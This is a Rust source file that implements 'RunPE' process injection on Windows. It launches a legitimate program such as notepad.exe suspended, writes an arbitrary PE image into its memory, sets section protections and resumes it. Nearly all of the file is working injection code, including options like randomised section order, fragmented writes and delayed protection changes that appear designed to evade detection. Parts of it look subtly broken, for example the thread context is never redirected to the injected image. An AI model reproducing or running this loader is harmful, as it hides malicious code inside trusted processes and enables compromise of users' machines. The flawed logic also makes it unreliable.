

use std::io;
use anyhow::Result;

#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Threading::{
    CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA,
    CREATE_SUSPENDED, INFINITE, ResumeThread, TerminateProcess,
};

#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE,
    PAGE_READONLY, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
};

#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Diagnostics::Debug::{
    IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_WRITE,
};

#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Diagnostics::Debug::{
    WriteProcessMemory, ReadProcessMemory,
};

#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Diagnostics::Debug::{
    IMAGE_NT_HEADERS32, IMAGE_SECTION_HEADER,
};

#[cfg(target_os = "windows")]
use windows_sys::Win32::System::SystemServices::{
    IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE,
};

#[cfg(target_os = "windows")]
use windows_sys::Win32::System::ProcessStatus::{
    GetModuleInformation, MODULEINFO,
};

#[derive(thiserror::Error, Debug)]
pub enum RunPeError {
    #[error("I/O error: {0}")]
    IoError(#[from] io::Error),
    
    #[error("Process creation failed: {0}")]
    ProcessCreationFailed(String),
    
    #[error("Memory operation failed: {0}")]
    MemoryOperationFailed(String),
    
    #[error("Invalid PE format: {0}")]
    InvalidPeFormat(String),
    
    #[error("Thread operation failed: {0}")]
    ThreadOperationFailed(String),
    
    #[error("Not supported on this platform")]
    NotSupported,
}

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum MemoryAllocationStrategy {
    Standard,
    
    NonContiguous,
    
    RandomPadding,
    
    ReverseOrder,
    
    HollowedRegion,
}

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum SectionMappingStrategy {
    Standard,
    
    RandomOrder,
    
    Fragmented,
    
    CustomProtection,
    
    DelayedProtection,
}

#[derive(Debug, Clone)]
pub struct RunPeConfig {
    pub target_path: String,
    pub arguments: Option<String>,
    pub auto_resume: bool,
    pub memory_strategy: MemoryAllocationStrategy,
    pub section_strategy: SectionMappingStrategy,
}

impl Default for RunPeConfig {
    fn default() -> Self {
        Self {
            target_path: "C:\\Windows\\System32\\notepad.exe".to_string(),
            arguments: None,
            auto_resume: true,
            memory_strategy: MemoryAllocationStrategy::Standard,
            section_strategy: SectionMappingStrategy::Standard,
        }
    }
}

#[cfg(target_os = "windows")]
pub fn inject_pe(pe_data: &[u8], config: &RunPeConfig) -> Result<u32, RunPeError> {
    let mut startup_info: STARTUPINFOA = unsafe { std::mem::zeroed() };
    startup_info.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
    
    let mut process_info: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
    
    let target_path = std::ffi::CString::new(config.target_path.as_str())
        .map_err(|e| RunPeError::ProcessCreationFailed(format!("Invalid target path: {}", e)))?;
    
    let arguments = match &config.arguments {
        Some(args) => {
            let mut cmd = config.target_path.clone();
            cmd.push(' ');
            cmd.push_str(args);
            Some(std::ffi::CString::new(cmd)
                .map_err(|e| RunPeError::ProcessCreationFailed(format!("Invalid arguments: {}", e)))?)
        },
        None => None,
    };
    
    let args_ptr = match &arguments {
        Some(args) => args.as_ptr(),
        None => std::ptr::null(),
    };
    
    let success = unsafe {
        CreateProcessA(
            target_path.as_ptr() as *const u8,
            args_ptr as *mut u8,
            std::ptr::null(),
            std::ptr::null(),
            0,
            CREATE_SUSPENDED,
            std::ptr::null(),
            std::ptr::null(),
            &mut startup_info,
            &mut process_info,
        )
    };
    
    if success == 0 {
        return Err(RunPeError::ProcessCreationFailed(format!(
            "CreateProcessA failed with error code: {}",
            unsafe { windows_sys::Win32::Foundation::GetLastError() }
        )));
    }
    
    let mut module_info: MODULEINFO = unsafe { std::mem::zeroed() };
    let success = unsafe {
        GetModuleInformation(
            process_info.hProcess,
            0, // Use 0 instead of null_mut() for HMODULE
            &mut module_info,
            std::mem::size_of::<MODULEINFO>() as u32,
        )
    };
    
    if success == 0 {
        unsafe { TerminateProcess(process_info.hProcess, 1); }
        return Err(RunPeError::MemoryOperationFailed(format!(
            "K32GetModuleInformation failed with error code: {}",
            unsafe { windows_sys::Win32::Foundation::GetLastError() }
        )));
    }
    
    if pe_data.len() < 64 {
        unsafe { TerminateProcess(process_info.hProcess, 1); }
        return Err(RunPeError::InvalidPeFormat("PE data too small".into()));
    }

    let dos_header = unsafe { &*(pe_data.as_ptr() as *const IMAGE_DOS_HEADER) };
    if dos_header.e_magic != IMAGE_DOS_SIGNATURE as u16 {
        unsafe { TerminateProcess(process_info.hProcess, 1); }
        return Err(RunPeError::InvalidPeFormat("Invalid DOS signature".into()));
    }

    let nt_headers_offset = dos_header.e_lfanew as usize;
    let nt_header_32 = unsafe {
        &*(pe_data.as_ptr().add(nt_headers_offset) as *const IMAGE_NT_HEADERS32)
    };
    if nt_header_32.Signature != IMAGE_NT_SIGNATURE {
        unsafe { TerminateProcess(process_info.hProcess, 1); }
        return Err(RunPeError::InvalidPeFormat("Invalid NT signature".into()));
    }

    let opt_header = &nt_header_32.OptionalHeader;
    let image_size = opt_header.SizeOfImage as usize;
    let entry_rva = opt_header.AddressOfEntryPoint as usize;

    let remote_base = match config.memory_strategy {
        MemoryAllocationStrategy::Standard => {
            allocate_standard_memory(process_info.hProcess, image_size)?
        },
        MemoryAllocationStrategy::NonContiguous => {
            allocate_non_contiguous_memory(process_info.hProcess, image_size)?
        },
        MemoryAllocationStrategy::RandomPadding => {
            allocate_memory_with_padding(process_info.hProcess, image_size)?
        },
        MemoryAllocationStrategy::ReverseOrder => {
            allocate_memory_reverse_order(process_info.hProcess, image_size)?
        },
        MemoryAllocationStrategy::HollowedRegion => {
            allocate_hollowed_region_memory(process_info.hProcess, image_size)?
        },
    };

    let success = unsafe {
        WriteProcessMemory(
            process_info.hProcess,
            remote_base,
            pe_data.as_ptr() as *const std::ffi::c_void,
            opt_header.SizeOfHeaders as usize,
            std::ptr::null_mut(),
        )
    };
    if success == 0 {
        unsafe { TerminateProcess(process_info.hProcess, 1); }
        return Err(RunPeError::MemoryOperationFailed(format!(
            "WriteProcessMemory failed for headers: {}",
            unsafe { windows_sys::Win32::Foundation::GetLastError() }
        )));
    }

    let num_sections = nt_header_32.FileHeader.NumberOfSections as usize;
    let section_header_ptr = unsafe {
        pe_data.as_ptr()
            .add(nt_headers_offset)
            .add(std::mem::size_of::<IMAGE_NT_HEADERS32>())
    } as *const IMAGE_SECTION_HEADER;

    let sections = unsafe { std::slice::from_raw_parts(section_header_ptr, num_sections) };
    match config.section_strategy {
        SectionMappingStrategy::Standard => {
            map_sections_standard(process_info.hProcess, remote_base, pe_data, sections)?
        },
        SectionMappingStrategy::RandomOrder => {
            map_sections_random_order(process_info.hProcess, remote_base, pe_data, sections)?
        },
        SectionMappingStrategy::Fragmented => {
            map_sections_fragmented(process_info.hProcess, remote_base, pe_data, sections)?
        },
        SectionMappingStrategy::CustomProtection => {
            map_sections_custom_protection(process_info.hProcess, remote_base, pe_data, sections)?
        },
        SectionMappingStrategy::DelayedProtection => {
            map_sections_delayed_protection(process_info.hProcess, remote_base, pe_data, sections)?
        },
    }

    for sect in sections {
        let virt_addr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
        let virt_size = unsafe { sect.Misc.VirtualSize as usize };
        if virt_size == 0 {
            continue;
        }

        let characteristics = sect.Characteristics;
        let is_exec = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        let is_write = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;

        let new_protect = match (is_exec, is_write) {
            (true, true) => PAGE_EXECUTE_READWRITE,
            (true, false) => PAGE_EXECUTE_READ,
            (false, true) => PAGE_READWRITE,
            _ => PAGE_READONLY,
        };

        let mut old_protect = 0;
        let success = unsafe {
            VirtualProtectEx(
                process_info.hProcess,
                virt_addr,
                virt_size,
                new_protect,
                &mut old_protect,
            )
        };
        if success == 0 {
            unsafe { TerminateProcess(process_info.hProcess, 1); }
            return Err(RunPeError::MemoryOperationFailed(format!(
                "VirtualProtectEx failed: {}",
                unsafe { windows_sys::Win32::Foundation::GetLastError() }
            )));
        }
    }

    if config.auto_resume {
        let resume_result = unsafe { ResumeThread(process_info.hThread) };
        if resume_result == u32::MAX {
            unsafe { TerminateProcess(process_info.hProcess, 1); }
            return Err(RunPeError::ThreadOperationFailed(format!(
                "ResumeThread failed: {}",
                unsafe { windows_sys::Win32::Foundation::GetLastError() }
            )));
        }
    }

    Ok(process_info.dwProcessId)
}

#[cfg(target_os = "windows")]
fn allocate_standard_memory(process_handle: isize, image_size: usize) -> Result<*mut std::ffi::c_void, RunPeError> {
    let remote_base = unsafe {
        VirtualAllocEx(
            process_handle,
            std::ptr::null_mut(),
            image_size,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
        )
    };
    
    if remote_base.is_null() {
        unsafe { TerminateProcess(process_handle, 1); }
        return Err(RunPeError::MemoryOperationFailed(format!(
            "VirtualAllocEx failed: {}",
            unsafe { windows_sys::Win32::Foundation::GetLastError() }
        )));
    }
    
    Ok(remote_base)
}

#[cfg(target_os = "windows")]
fn allocate_non_contiguous_memory(process_handle: isize, image_size: usize) -> Result<*mut std::ffi::c_void, RunPeError> {
    let remote_base = unsafe {
        VirtualAllocEx(
            process_handle,
            std::ptr::null_mut(),
            image_size,
            MEM_RESERVE,
            PAGE_READWRITE,
        )
    };
    
    if remote_base.is_null() {
        unsafe { TerminateProcess(process_handle, 1); }
        return Err(RunPeError::MemoryOperationFailed(format!(
            "VirtualAllocEx failed during reservation: {}",
            unsafe { windows_sys::Win32::Foundation::GetLastError() }
        )));
    }
    
    let chunk_size = 4096; // Page size
    let mut offset = 0;
    
    while offset < image_size {
        let size = std::cmp::min(chunk_size, image_size - offset);
        let addr = (remote_base as usize + offset) as *mut std::ffi::c_void;
        
        let result = unsafe {
            VirtualAllocEx(
                process_handle,
                addr,
                size,
                MEM_COMMIT,
                PAGE_READWRITE,
            )
        };
        
        if result.is_null() {
            unsafe { TerminateProcess(process_handle, 1); }
            return Err(RunPeError::MemoryOperationFailed(format!(
                "VirtualAllocEx failed during commit at offset {}: {}",
                offset,
                unsafe { windows_sys::Win32::Foundation::GetLastError() }
            )));
        }
        
        offset += size;
    }
    
    Ok(remote_base)
}

#[cfg(target_os = "windows")]
fn allocate_memory_with_padding(process_handle: isize, image_size: usize) -> Result<*mut std::ffi::c_void, RunPeError> {
    let padding = (std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() % 4096) as usize;
    
    let padded_size = image_size + padding;
    
    let remote_base = unsafe {
        VirtualAllocEx(
            process_handle,
            std::ptr::null_mut(),
            padded_size,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
        )
    };
    
    if remote_base.is_null() {
        unsafe { TerminateProcess(process_handle, 1); }
        return Err(RunPeError::MemoryOperationFailed(format!(
            "VirtualAllocEx failed with padding: {}",
            unsafe { windows_sys::Win32::Foundation::GetLastError() }
        )));
    }
    
    Ok(remote_base)
}

#[cfg(target_os = "windows")]
fn allocate_memory_reverse_order(process_handle: isize, image_size: usize) -> Result<*mut std::ffi::c_void, RunPeError> {
    let hint_address = 0x7FFF0000 as *mut std::ffi::c_void;
    
    let remote_base = unsafe {
        VirtualAllocEx(
            process_handle,
            hint_address,
            image_size,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
        )
    };
    
    if remote_base.is_null() {
        return allocate_standard_memory(process_handle, image_size);
    }
    
    Ok(remote_base)
}

#[cfg(target_os = "windows")]
fn map_sections_standard(
    process_handle: isize,
    remote_base: *mut std::ffi::c_void,
    pe_data: &[u8],
    sections: &[IMAGE_SECTION_HEADER],
) -> Result<(), RunPeError> {
    for sect in sections {
        let src_ptr = unsafe { pe_data.as_ptr().add(sect.PointerToRawData as usize) };
        let dest_ptr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
        let raw_size = sect.SizeOfRawData as usize;

        if raw_size > 0 {
            let success = unsafe {
                WriteProcessMemory(
                    process_handle,
                    dest_ptr,
                    src_ptr as *const std::ffi::c_void,
                    raw_size,
                    std::ptr::null_mut(),
                )
            };
            if success == 0 {
                unsafe { TerminateProcess(process_handle, 1); }
                return Err(RunPeError::MemoryOperationFailed(format!(
                    "WriteProcessMemory failed for section: {}",
                    unsafe { windows_sys::Win32::Foundation::GetLastError() }
                )));
            }
        }
        
        let virt_addr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
        let virt_size = unsafe { sect.Misc.VirtualSize as usize };
        if virt_size == 0 {
            continue;
        }

        let characteristics = sect.Characteristics;
        let is_exec = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        let is_write = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;

        let new_protect = match (is_exec, is_write) {
            (true, true) => PAGE_EXECUTE_READWRITE,
            (true, false) => PAGE_EXECUTE_READ,
            (false, true) => PAGE_READWRITE,
            _ => PAGE_READONLY,
        };

        let mut old_protect = 0;
        let success = unsafe {
            VirtualProtectEx(
                process_handle,
                virt_addr,
                virt_size,
                new_protect,
                &mut old_protect,
            )
        };
        if success == 0 {
            unsafe { TerminateProcess(process_handle, 1); }
            return Err(RunPeError::MemoryOperationFailed(format!(
                "VirtualProtectEx failed: {}",
                unsafe { windows_sys::Win32::Foundation::GetLastError() }
            )));
        }
    }
    
    Ok(())
}

#[cfg(target_os = "windows")]
fn map_sections_random_order(
    process_handle: isize,
    remote_base: *mut std::ffi::c_void,
    pe_data: &[u8],
    sections: &[IMAGE_SECTION_HEADER],
) -> Result<(), RunPeError> {
    let mut indices: Vec<usize> = (0..sections.len()).collect();
    
    let seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    
    for i in (1..indices.len()).rev() {
        let j = (seed % (i as u128 + 1)) as usize;
        indices.swap(i, j);
    }
    
    for &idx in &indices {
        let sect = &sections[idx];
        let src_ptr = unsafe { pe_data.as_ptr().add(sect.PointerToRawData as usize) };
        let dest_ptr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
        let raw_size = sect.SizeOfRawData as usize;

        if raw_size > 0 {
            let success = unsafe {
                WriteProcessMemory(
                    process_handle,
                    dest_ptr,
                    src_ptr as *const std::ffi::c_void,
                    raw_size,
                    std::ptr::null_mut(),
                )
            };
            if success == 0 {
                unsafe { TerminateProcess(process_handle, 1); }
                return Err(RunPeError::MemoryOperationFailed(format!(
                    "WriteProcessMemory failed for section: {}",
                    unsafe { windows_sys::Win32::Foundation::GetLastError() }
                )));
            }
        }
        
        let virt_addr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
        let virt_size = unsafe { sect.Misc.VirtualSize as usize };
        if virt_size == 0 {
            continue;
        }

        let characteristics = sect.Characteristics;
        let is_exec = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        let is_write = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;

        let new_protect = match (is_exec, is_write) {
            (true, true) => PAGE_EXECUTE_READWRITE,
            (true, false) => PAGE_EXECUTE_READ,
            (false, true) => PAGE_READWRITE,
            _ => PAGE_READONLY,
        };

        let mut old_protect = 0;
        let success = unsafe {
            VirtualProtectEx(
                process_handle,
                virt_addr,
                virt_size,
                new_protect,
                &mut old_protect,
            )
        };
        if success == 0 {
            unsafe { TerminateProcess(process_handle, 1); }
            return Err(RunPeError::MemoryOperationFailed(format!(
                "VirtualProtectEx failed: {}",
                unsafe { windows_sys::Win32::Foundation::GetLastError() }
            )));
        }
    }
    
    Ok(())
}

#[cfg(target_os = "windows")]
fn map_sections_fragmented(
    process_handle: isize,
    remote_base: *mut std::ffi::c_void,
    pe_data: &[u8],
    sections: &[IMAGE_SECTION_HEADER],
) -> Result<(), RunPeError> {
    for sect in sections {
        let src_ptr = unsafe { pe_data.as_ptr().add(sect.PointerToRawData as usize) };
        let dest_ptr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
        let raw_size = sect.SizeOfRawData as usize;

        if raw_size > 0 {
            let chunk_size = 1024; // 1KB chunks
            let mut offset = 0;
            
            while offset < raw_size {
                let size = std::cmp::min(chunk_size, raw_size - offset);
                let src_chunk_ptr = unsafe { src_ptr.add(offset) };
                let dest_chunk_ptr = unsafe { (dest_ptr as *mut u8).add(offset) as *mut std::ffi::c_void };
                
                let success = unsafe {
                    WriteProcessMemory(
                        process_handle,
                        dest_chunk_ptr,
                        src_chunk_ptr as *const std::ffi::c_void,
                        size,
                        std::ptr::null_mut(),
                    )
                };
                if success == 0 {
                    unsafe { TerminateProcess(process_handle, 1); }
                    return Err(RunPeError::MemoryOperationFailed(format!(
                        "WriteProcessMemory failed for section chunk: {}",
                        unsafe { windows_sys::Win32::Foundation::GetLastError() }
                    )));
                }
                
                offset += size;
                
                if offset < raw_size {
                    std::thread::sleep(std::time::Duration::from_micros(1));
                }
            }
        }
        
        let virt_addr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
        let virt_size = unsafe { sect.Misc.VirtualSize as usize };
        if virt_size == 0 {
            continue;
        }

        let characteristics = sect.Characteristics;
        let is_exec = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        let is_write = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;

        let new_protect = match (is_exec, is_write) {
            (true, true) => PAGE_EXECUTE_READWRITE,
            (true, false) => PAGE_EXECUTE_READ,
            (false, true) => PAGE_READWRITE,
            _ => PAGE_READONLY,
        };

        let mut old_protect = 0;
        let success = unsafe {
            VirtualProtectEx(
                process_handle,
                virt_addr,
                virt_size,
                new_protect,
                &mut old_protect,
            )
        };
        if success == 0 {
            unsafe { TerminateProcess(process_handle, 1); }
            return Err(RunPeError::MemoryOperationFailed(format!(
                "VirtualProtectEx failed: {}",
                unsafe { windows_sys::Win32::Foundation::GetLastError() }
            )));
        }
    }
    
    Ok(())
}

#[cfg(target_os = "windows")]
fn map_sections_custom_protection(
    process_handle: isize,
    remote_base: *mut std::ffi::c_void,
    pe_data: &[u8],
    sections: &[IMAGE_SECTION_HEADER],
) -> Result<(), RunPeError> {
    for sect in sections {
        let src_ptr = unsafe { pe_data.as_ptr().add(sect.PointerToRawData as usize) };
        let dest_ptr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
        let raw_size = sect.SizeOfRawData as usize;

        if raw_size > 0 {
            let success = unsafe {
                WriteProcessMemory(
                    process_handle,
                    dest_ptr,
                    src_ptr as *const std::ffi::c_void,
                    raw_size,
                    std::ptr::null_mut(),
                )
            };
            if success == 0 {
                unsafe { TerminateProcess(process_handle, 1); }
                return Err(RunPeError::MemoryOperationFailed(format!(
                    "WriteProcessMemory failed for section: {}",
                    unsafe { windows_sys::Win32::Foundation::GetLastError() }
                )));
            }
        }
        
        let virt_addr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
        let virt_size = unsafe { sect.Misc.VirtualSize as usize };
        if virt_size == 0 {
            continue;
        }

        let characteristics = sect.Characteristics;
        let is_exec = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        let is_write = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;

        let mut old_protect = 0;
        let mut success = unsafe {
            VirtualProtectEx(
                process_handle,
                virt_addr,
                virt_size,
                PAGE_READWRITE,
                &mut old_protect,
            )
        };
        if success == 0 {
            unsafe { TerminateProcess(process_handle, 1); }
            return Err(RunPeError::MemoryOperationFailed(format!(
                "VirtualProtectEx initial failed: {}",
                unsafe { windows_sys::Win32::Foundation::GetLastError() }
            )));
        }
        
        let final_protect = match (is_exec, is_write) {
            (true, true) => PAGE_EXECUTE_READWRITE,
            (true, false) => PAGE_EXECUTE_READ,
            (false, true) => PAGE_READWRITE,
            _ => PAGE_READONLY,
        };

        success = unsafe {
            VirtualProtectEx(
                process_handle,
                virt_addr,
                virt_size,
                final_protect,
                &mut old_protect,
            )
        };
        if success == 0 {
            unsafe { TerminateProcess(process_handle, 1); }
            return Err(RunPeError::MemoryOperationFailed(format!(
                "VirtualProtectEx final failed: {}",
                unsafe { windows_sys::Win32::Foundation::GetLastError() }
            )));
        }
    }
    
    Ok(())
}

#[cfg(target_os = "windows")]
fn allocate_hollowed_region_memory(
    process_handle: isize,
    image_size: usize,
) -> Result<*mut std::ffi::c_void, RunPeError> {
    let extra_size = 4096 * 4; // 4 pages extra
    
    let remote_base = unsafe {
        VirtualAllocEx(
            process_handle,
            std::ptr::null_mut(),
            image_size + extra_size,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
        )
    };
    
    if remote_base.is_null() {
        unsafe { TerminateProcess(process_handle, 1); }
        return Err(RunPeError::MemoryOperationFailed(format!(
            "VirtualAllocEx failed during initial allocation: {}",
            unsafe { windows_sys::Win32::Foundation::GetLastError() }
        )));
    }
    
    let middle_addr = (remote_base as usize + image_size / 2) as *mut std::ffi::c_void;
    let middle_size = std::cmp::min(4096 * 2, image_size / 4);
    
    let success = unsafe {
        windows_sys::Win32::System::Memory::VirtualFreeEx(
            process_handle,
            middle_addr,
            middle_size,
            windows_sys::Win32::System::Memory::MEM_DECOMMIT,
        )
    };
    
    if success == 0 {
        log::warn!("Failed to decommit memory region, continuing with standard allocation");
    }
    
    let result = unsafe {
        VirtualAllocEx(
            process_handle,
            middle_addr,
            middle_size,
            MEM_COMMIT,
            PAGE_READWRITE,
        )
    };
    
    if result.is_null() {
        log::warn!("Failed to reallocate memory region, continuing with standard allocation");
    }
    
    Ok(remote_base)
}

#[cfg(target_os = "windows")]
fn map_sections_delayed_protection(
    process_handle: isize,
    remote_base: *mut std::ffi::c_void,
    pe_data: &[u8],
    sections: &[IMAGE_SECTION_HEADER],
) -> Result<(), RunPeError> {
    for sect in sections {
        let virt_addr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
        let virt_size = unsafe { sect.Misc.VirtualSize as usize };
        let raw_size = sect.SizeOfRawData as usize;
        let raw_ptr = pe_data.as_ptr().wrapping_add(sect.PointerToRawData as usize);
        
        if virt_size == 0 || raw_size == 0 {
            continue;
        }
        
        let success = unsafe {
            WriteProcessMemory(
                process_handle,
                virt_addr,
                raw_ptr as *const std::ffi::c_void,
                std::cmp::min(virt_size, raw_size),
                std::ptr::null_mut(),
            )
        };
        
        if success == 0 {
            unsafe { TerminateProcess(process_handle, 1); }
            return Err(RunPeError::MemoryOperationFailed(format!(
                "WriteProcessMemory failed for section: {}",
                unsafe { windows_sys::Win32::Foundation::GetLastError() }
            )));
        }
    }
    
    std::thread::sleep(std::time::Duration::from_millis(50));
    
    for sect in sections {
        let virt_addr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
        let virt_size = unsafe { sect.Misc.VirtualSize as usize };
        
        if virt_size == 0 {
            continue;
        }
        
        let characteristics = sect.Characteristics;
        let is_exec = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        let is_write = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;
        
        let new_protect = match (is_exec, is_write) {
            (true, true) => PAGE_EXECUTE_READWRITE,
            (true, false) => PAGE_EXECUTE_READ,
            (false, true) => PAGE_READWRITE,
            _ => PAGE_READONLY,
        };
        
        let mut old_protect = 0;
        let success = unsafe {
            VirtualProtectEx(
                process_handle,
                virt_addr,
                virt_size,
                new_protect,
                &mut old_protect,
            )
        };
        
        if success == 0 {
            unsafe { TerminateProcess(process_handle, 1); }
            return Err(RunPeError::MemoryOperationFailed(format!(
                "VirtualProtectEx failed: {}",
                unsafe { windows_sys::Win32::Foundation::GetLastError() }
            )));
        }
    }
    
    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn inject_pe(_pe_data: &[u8], _config: &RunPeConfig) -> Result<u32, RunPeError> {
    Err(RunPeError::NotSupported)
}
